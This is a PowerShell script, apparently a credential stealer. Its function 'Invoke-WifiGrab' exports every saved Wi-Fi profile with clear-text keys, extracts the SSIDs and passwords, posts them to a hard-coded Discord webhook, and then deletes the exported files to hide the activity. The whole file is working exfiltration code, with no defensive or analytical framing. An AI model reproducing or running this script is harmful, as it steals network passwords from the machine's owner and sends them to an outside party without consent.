function Invoke-WifiGrab {
    # Navigate to the temporary folder
    cd $env:temp

    # Export all Wi-Fi profiles with keys (passwords) visible
    netsh wlan export profile key=clear | Out-Null

    # Search for keyMaterial lines in the exported XML files
    Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS

    # Define the webhook URL
    $webhookUrl = "https://discord.com/api/webhooks/1142817266640105592/-QJ9WtjaDql0VTdtva9RcAaLGyfN9bNYL0yDYiHBSaQsvau0di1-lI71t-slx6aVPNO6"

    # Read the extracted key materials from the file
    $keyMaterialContent = Get-Content -Path "Wi-Fi-PASS" -Raw

    # Initialize an array to store formatted Wi-Fi details
    $formattedWiFiList = @()

    # Extract SSID and Passwords between <keyMaterial> tags using regex
    $regex = '<keyMaterial>(.*?)<\/keyMaterial>'
    $matches = [regex]::Matches($keyMaterialContent, $regex)

    # Extract SSIDs from the XML filenames and match with the passwords
    $xmlFiles = Get-ChildItem -Filter 'Wi*.xml'

    foreach ($xmlFile in $xmlFiles) {
        # Extract SSID from the XML filename (before ".xml")
        $ssid = [System.IO.Path]::GetFileNameWithoutExtension($xmlFile.Name) -replace 'Wi-Fi-', ''

        # Find corresponding password match
        $passwordMatch = [regex]::Match((Get-Content $xmlFile.FullName -Raw), $regex)
        if ($passwordMatch.Success) {
            $password = $passwordMatch.Groups[1].Value

            # Append to the list for sending to Discord
            $formattedWiFiList += "-----------------------"
            $formattedWiFiList += "SSID: $ssid"
            $formattedWiFiList += "Password: $password"
        }
    }

    # Convert the list to a string for the Discord message
    $formattedWiFiString = $formattedWiFiList -join "`n"

    # Prepare JSON payload
    $jsonData = @{
        content = "null"
        embeds = @(
            @{
                title = "Wi-fi List:"
                description = $formattedWiFiString
                color = 1422226
            }
        )
        attachments = @()
    } | ConvertTo-Json

    # Send data to Discord webhook
    Invoke-WebRequest -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $jsonData | Out-Null

    # Optionally clean up the exported files
    Remove-Item Wi-*
}
